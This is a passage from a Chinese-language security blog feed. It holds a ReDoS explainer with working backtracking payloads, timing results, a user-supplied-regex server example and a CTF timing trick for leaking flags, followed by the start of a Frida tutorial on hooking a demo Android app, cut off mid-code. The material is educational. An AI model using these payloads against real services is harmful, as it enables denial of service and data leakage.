    <updated>2023-06-13T14:43:16.802Z</updated>
    
    <content type="html"><![CDATA[<p>Regular expression，中文又翻作「正規表達式」或是「正規表示式」等等（以下簡稱 regexp），主要是用來做字串的配對，寫好一個模式之後，就可以拿來配對到符合規則的文字。</p><p>無論是電話號碼、Email 或是身分證字號等等，都可以運用 regexp 來完成初步的格式驗證，確保字串的格式與特定規則相符合。</p><p>Regexp 雖然方便，但沒寫好的話有可能導致一些輸入的驗證被繞過，演變成資安問題；而除了這個之外，還有另外一種也會造成問題，就是這篇要來講的 ReDoS，全名為：Regular expression Denial-of-Service，因為正規表達式所引起的阻斷服務攻擊。</p><span id="more"></span><p>在講 ReDoS 之前，先來提一下什麼是 DoS。</p><p>舉例來說，假設假設某個網站框架對於 HTTP 請求的解析沒有做好，只要碰到特殊字元就會壞掉，造成伺服器重啟，而這時攻擊者就可以不斷送出這種會讓網站壞掉的請求，造成伺服器一直重啟，這就是一種 DoS。</p><p>如果要分更細的話，還可以分成攻擊的是哪一層，例如說是網路層還是應用層等等，這篇講的都是針對應用層的攻擊。</p><p>大家平常在網路新聞看到的攻擊，比較多應該是屬於 DDoS，前面多了一個 D，意思是 distributed，分散式的，而且都是針對網路層的攻擊居多。前面我們舉的 DoS 例子可以看出基本上都是網站本身有問題，例如說沒有考慮到特殊狀況等等，才會讓攻擊者可以利用，而 DDoS 比較像是：「不管你有沒有問題，我找一堆人把你塞爆」</p><p>以現實生活來舉例，你開了一間小吃店，賣一些常見的東西像是乾麵啦，燙青菜啦等等，因為每次要看客人的菜單點了什麼很花時間，又覺得用手機點餐很沒有人情味，因此訂製了一個「讀菜單機器人」，來幫你看客人的點菜單。</p><p>這時候我故意在點菜單上面鬼畫符，但有些地方看似正常，讓菜單看起來很吃力，機器人的辨識功能沒有做好，沒辦法解讀，於是就停擺了，這就叫做 DoS，以一己之力耗盡資源。</p><p>我找一百個人去你那邊，每個人都畫一堆空白菜單丟給機器人，讓機器人應接不暇，沒辦法處理其他客人的菜單，這就叫做 DDoS。</p><p>簡單來說呢，DoS 通常是「以少量的資源就能造成服務中斷」，而 DDoS 則是「用比超級多的資源直接把你服務打掛」。</p><p>好，讓我們講回 DoS，從前面的例子可以看出來，當你的程式本身就有一些問題的時候，是最容易出事的。符合了這個前提，就很容易以一人之力，用簡單的方式把你的服務弄掛。</p><p>而 ReDoS 就是靠著沒寫好的 regular expression 來達成這件事。</p><h2><span id="話不多說直接舉例">話不多說，直接舉例</span></h2><p>直接看範例最快：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(a|a?)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// test: 2128.498046875 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一個 26 個字的字串，需要 2 秒鐘才能配對完畢。順帶一提，這個 regexp 所需要的時間是以倍數計算的，再多一個字需要 4 秒，然後 8 秒，16 秒，以此類推。</p><p>那為什麼這個 regexp 需要這麼久的時間呢？</p><p>這跟 regexp 引擎的實作以及原理有關，細節我也還沒研究清楚就不誤導大眾了，但簡單來說就是 regexp 引擎必須要遍歷所有的可能性以後才能發現字串不符合，所以花了這麼久的時間。</p><p>總而言之，如果 regexp 沒寫好，會造成使用的時候消耗大量時間。</p><h2><span id="實際案例">實際案例</span></h2><p>你可能會想說，regexp 有這麼容易寫壞嗎？</p><p>還真的有，一大堆的 library 都出現過 ReDoS 的漏洞，還有人整理出一個詳細的列表：<a href="https://github.com/engn33r/awesome-redos-security">Awesome ReDoS Security</a></p><p>舉例來說，CKEditor 以前有一個偵測是否是圖片網址的 regexp，傳入精心構造的字串後需要 6 秒才會執行完畢：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0</span><span class="token keyword">const</span> <span class="token constant">IMAGE_URL_REGEXP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span> <span class="token function">String</span><span class="token punctuation">(</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(http(s)?:\/\/)?[\w-]+(\.[\w-]+)+[\w._~:/?#[\]@!$&amp;'()*+,;=%-]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token operator">+</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)\??[\w._~:/#[\]@!$&amp;'()*+,;=%-]*$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">IMAGE_URL_REGEXP</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a.'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeLog</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">// test: 6231.137939453125 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>雖然說字串長度有 10 萬，但如果改成沒問題的版本，不到 1 毫秒就能跑出結果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0</span><span class="token keyword">const</span> <span class="token constant">IMAGE_URL_REGEXP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span> <span class="token function">String</span><span class="token punctuation">(</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(http(s)?:\/\/)?[\w-]+\.[\w._~:/?#[\]@!$&amp;'()*+,;=%-]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token operator">+</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)(\?[\w._~:/#[\]@!$&amp;'()*+,;=%-]*)?$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">IMAGE_URL_REGEXP</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a.'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeLog</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">// test: 0.570068359375 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以 JavaScript 來說，這些配對的程式碼都是跑在 main thread，如果是網頁的話會直接畫面凍結，直接卡死，如果是以 Node.js 來執行的伺服器也會卡住，無法處理其他請求。</p><h2><span id="該怎麼知道有沒有-redos-的風險">該怎麼知道有沒有 ReDoS 的風險？</span></h2><p>有一些現成的工具可以幫忙，我自己最常用的是這個：<a href="https://devina.io/redos-checker">https://devina.io/redos-checker</a></p><p>只要把 regexp 丟進去，就可以跟你說有沒有問題，有的話還會附上測試的字串，讓你可以自己再測試一遍。</p><p><img src="/img/redos-regular-expression-denial-of-service/p1.png" alt="devina redos checker"></p><p>不過有時候會有 false positive 就是了，它覺得有但是沒有，或也有可能真的有，但是它給的攻擊字串跑不出來。因此還是建議測完以後自己拿它給的 payload 再試一次，確認一下。</p><h2><span id="redos-在攻擊上的應用">ReDoS 在攻擊上的應用</span></h2><p>前面講的都是「regexp 已經寫好，而使用者可以控制輸入」，這時候只要找到有問題的 regexp 產生攻擊字串即可。</p><p>而有另外一種狀況是：「使用者可以控制 regexp」。舉例來說，假設有個網站提供搜尋使用者的功能，你可以傳入一個 regexp，伺服器就會回傳是否有符合此 regexp 的 username 存在。</p><p>伺服器的實作大概如下（隨意寫的，意思有到就好）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q    <span class="token keyword">return</span> users        <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">user</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這個危險的功能除了可以讓攻擊者把所有的 username 都拿到手以外，也會有 ReDoS 的風險在。</p><p>舉例來說，當 <code>/((([^m]|[^m]?)+)+)+$/</code> 這個 regexp 碰到 <code>&quot;username&quot;</code> 時，需要花費將近 4 秒才能跑完：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">((([^m]|[^m]?)+)+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// test: 3728.89990234375 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只要繼續按照相同的模式把 regexp 延伸下去，就可以讓這整段程式碼執行超過 30 秒或是更久，癱瘓整個 server。</p><p>在打 CTF 時還有另一種常見的狀況是一樣可以傳入 regexp，但是伺服器不會跟你講有沒有成功，你只能根據時間差來判斷，這時候靠 ReDoS 就很有用了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">CTF&#123;[a](((((.*)*)*)*)*)!</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;this_is_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// CTF&#123;a: 0.071ms</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">CTF&#123;[t](((((.*)*)*)*)*)!</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;this_is_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// CTF&#123;t: 24.577s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>透過傳入精心構造的 regexp，就可以利用時間差得知第一個字元是什麼。</p><p>最後簡單提一下防禦方式，最根本的解決方法就是不要寫出有缺陷的 regexp，先去學習哪一些 pattern 應該盡量少用，就能掌握到大概的方向。除此之外，似乎也有人做了一些自動化的工具幫忙掃 code 裡面出現的 regexp，這也是一種在出事前先預防的方法。</p><h2><span id="總結">總結</span></h2><p>我自己覺得 ReDoS 是一個滿有趣的攻擊方式，以前沒想過靠著 regexp 還可以做出這種效果。</p><p>以前第一次知道這個攻擊，似乎是還在當開發者的時候，偶爾會看到使用到的 library 有這個漏洞，不過當初沒有很在意就是了。後來在資安裡面再度碰到這東西，才覺得好像挺有趣的。</p><p>這篇比較像是我的個人筆記，只是想趁著記憶猶新的時候把一些 payload 記下來，以後比較好找。</p><p>最後附上一些參考資料以及延伸閱讀，有興趣深入了解的讀者們可以看一下：</p><ol><li><a href="https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos">HackTricks - Regular expression Denial of Service - ReDoS</a></li><li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP: Regular expression Denial of Service - ReDoS</a></li><li><a href="https://learn.snyk.io/lessons/redos/javascript/">snyk: ReDoS</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Regular expression，中文又翻作「正規表達式」或是「正規表示式」等等（以下簡稱 regexp），主要是用來做字串的配對，寫好一個模式之後，就可以拿來配對到符合規則的文字。&lt;/p&gt;
&lt;p&gt;無論是電話號碼、Email 或是身分證字號等等，都可以運用 regexp 來完成初步的格式驗證，確保字串的格式與特定規則相符合。&lt;/p&gt;
&lt;p&gt;Regexp 雖然方便，但沒寫好的話有可能導致一些輸入的驗證被繞過，演變成資安問題；而除了這個之外，還有另外一種也會造成問題，就是這篇要來講的 ReDoS，全名為：Regular expression Denial-of-Service，因為正規表達式所引起的阻斷服務攻擊。&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Android App 逆向入門之四：使用 Frida 進行動態分析</title>
    <link href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-4/"/>
    <id>https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-4/</id>
    <published>2023-04-27T07:10:44.000Z</published>
    <updated>2023-06-07T09:23:15.872Z</updated>
    
    <content type="html"><![CDATA[<p>前面幾篇我們講的都是靜態分析的東西，也就是說我們並沒有把 app 跑起來，只是透過反編譯出來的程式碼研究 app 運作的邏輯，並且修改程式碼後重新打包執行。</p><p>而動態分析指的就是我們會把 app 跑起來，並透過一些方式讓我們可以 hook 各種方法，去監視某些 method 的輸入以及輸出，甚至是竄改。</p><p>這篇就讓我們來學習該怎麼樣使用 Frida 進行動態分析。</p><span id="more"></span><p>系列文連結：</p><ol><li><a href="/2023/04/27/android-apk-decompile-intro-1/">Android App 逆向入門之一：拆開與重組 apk</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-2/">Android App 逆向入門之二：修改 smali 程式碼</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-3/">Android App 逆向入門之三：監聽 app 封包</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-4/">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li></ol><h2><span id="工具介紹frida">工具介紹：Frida</span></h2><p>這次要來使用的動態分析工具為 <a href="https://frida.re/">Frida</a>，官網的介紹為：「Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.」，其實不只是 Android，其他平台也都可以使用 Frida 來做動態分析。</p><p>有一套叫做 Objection 的工具是以 Frida 為基礎開發的，建議可以直接裝這個，因為會順便連 Frida 一起裝好，安裝教學可參考：<a href="https://github.com/sensepost/objection/wiki/Installation">https://github.com/sensepost/objection/wiki/Installation</a></p><p>要用 Frida 的話，除了手機上要安裝以外，電腦也要安裝，至於如何安裝可直接參考官方網站的指示：<a href="https://frida.re/docs/installation/">https://frida.re/docs/installation/</a></p><p>另外提醒一下，如果是手機裡面已經有了但是換一台電腦，要記得安裝的版本要一致，步驟是：</p><ol><li>先去手機裡面看 frida 版本：<code>frida-server --version</code>，假設是 15.1.14 好了</li><li>到這邊找 frida-tools 的版本號 <a href="https://github.com/frida/frida/releases/tag/15.1.14">https://github.com/frida/frida/releases/tag/15.1.14</a></li><li>在電腦上安裝這兩個：</li></ol><pre class="line-numbers language-none"><code class="language-none">pip install frida&#x3D;&#x3D;15.1.14pip install frida-tools&#x3D;&#x3D;10.4.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>主要是版本號要對，不然會出現一堆錯誤。</p><p>另外，雖然說 Frida 這種東西感覺就是要 root 才能使用，但其實它有兩種方法可以跑，一種確實需要 root，另外一種不需要 root</p><p>需要 root 的要在手機上安裝 frida-server，詳情可參考官網：<a href="https://frida.re/docs/android/">https://frida.re/docs/android/</a></p><p>基本上就是丟個執行檔進去手機，然後用 root 的權限跑起來，檔案推進去要跑起來的時候如果不是預設 root，可以用 adb shell 進去改：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell<span class="token comment"># 先刪掉舊的</span><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> frida-server<span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token punctuation">&#123;</span>your_process_id<span class="token punctuation">&#125;</span><span class="token comment"># 確認用 root 跑</span><span class="token function">su</span>/data/local/tmp/frida-server <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑起來之後可以用 <code>frida-ps -U</code> 確認是否有跑起來</p><p>第二種不需要 root 的方法要改 apk，原理是在 apk 裡面加一個 Frida 的 so 檔，並在入口點加一行 <code>System.loadLibrary()</code>，就可以使用 Frida，在 wiki 裡面有詳細說明：<a href="https://github.com/sensepost/objection/wiki/Patching-Android-Applications">https://github.com/sensepost/objection/wiki/Patching-Android-Applications</a></p><p>上面改 apk 的流程不需要自己執行，有現成的指令幫你做，如果打包不起來可以用這個指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objection patchapk <span class="token parameter variable">--source</span> test.apk --skip-resources --ignore-nativelibs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果還是不行，可以運用我們之前學到的知識自己動手改造，先用 <code>apktool d</code> 把包好的 apk 拆開，然後自己改裡面東西，例如說有時候會有 so 檔案 align 的問題，就可以把 <code>AndroidManifest.xml</code> 裡的 <code>android:extractNativeLibs</code> 改成 true，再包回去就好了。</p><h2><span id="frida-基本使用">Frida 基本使用</span></h2><p>先講一下 Frida 是做什麼的，最普遍的用途是寫一些程式碼來 hook function，hook 指的就是你可以自己覆蓋任何一個 function 的實作，就可以觀察輸入以及輸出，也可以改變函式的回傳值。</p><p>而這些程式碼會用 JavaScript 來寫，並在啟動 app 時注入進去，以我自己的經驗來說，其實只要看多一點範例之後，就能滿快上手的。</p><p>講這麼多，不如動手來做做看，這次用的範例 app 跟第一篇一樣，就是個按下按鈕以後會檢測是否有 root 的 app：<a href="https://github.com/aszx87410/demo/raw/master/android/demoapp.apk">https://github.com/aszx87410/demo/raw/master/android/demoapp.apk</a></p><p>這個 app 開啟之後預設的 activity 會是 <code>com.cymetrics.demo/MainActivity</code>，我們先來 hook 這個 class 的 onCreate 方法看看。</p><p>我們先新建一個檔案 <code>script.js</code>，內容為：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接著下指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frida <span class="token parameter variable">-U</span> --no-pause <span class="token parameter variable">-l</span> script.js <span class="token parameter variable">-f</span> <span class="token string">"com.cymetrics.demo"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你沒有 root 的話，啟動方式會不太一樣，先照上面說的 patch app，接著在手機上安裝，然後在 terminal 輸入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frida <span class="token parameter variable">-U</span> Gadget <span class="token parameter variable">-l</span> script.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接著你應該會看到你的 terminal 上面多了一行 log，內容就是 <code>MainActivity onCreate</code>，而手機上出現 app crash 的訊息，這是正常的。</p><p>先來簡單講一下 Frida 腳本的基本結構，起手式就是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 程式碼放這邊</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接著就看你想要 hook 什麼樣的方法，以我們剛剛的程式碼來說，先用 <code>Java.use</code> 拿到想要 hook 的 class，再用 <code>MainActivity.onCreate.implementation</code> 把原本的實作換成我們自己定義的 function。</p><p>那為什麼 hook 之後 app 就掛掉了呢？因為我們自己實作的 function 除了 log 以外什麼都沒做，也就是說原本的 onCreate 該做的事情都被拿掉了，所以 crash 也是合情合理，想知道 crash 的根本原因可以 <code>adb logcat | grep AndroidRuntime</code> 一下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">android.util.SuperNotCalledException: Activity <span class="token punctuation">&#123;</span>com.cymetrics.demo/com.cymetrics.demo.MainActivity<span class="token punctuation">&#125;</span> did not call through to super.onCreate<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那我們應該怎麼做呢？只要記得在最後面呼叫原本的實作即可，這樣寫：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>this</code> 會是原本的 MainActivity，透過 <code>this.onCreate.call</code> 可以呼叫到原本的實作，而 call 這個方法第一個要傳入的參數就是 this，後面傳入參數。</p><p>執行上面腳本之後，會出現另外一個錯誤：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Error: onCreate<span class="token punctuation">(</span><span class="token punctuation">)</span>: argument types <span class="token keyword">do</span> not match any of:  .overload<span class="token punctuation">(</span><span class="token string">'android.os.Bundle'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>這是因為 onCreate 其實應該是有帶參數的，只是我們覆蓋的時候沒有接收參數，因此就出錯了。為了避免這個問題，我會建議在覆蓋實作的時候在前面加上 <code>.overload()</code>，像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Frida 就會再次出現錯誤訊息提示你正確的參數應該是什麼，就可以照著做，最後會像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'android.os.Bundle'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" 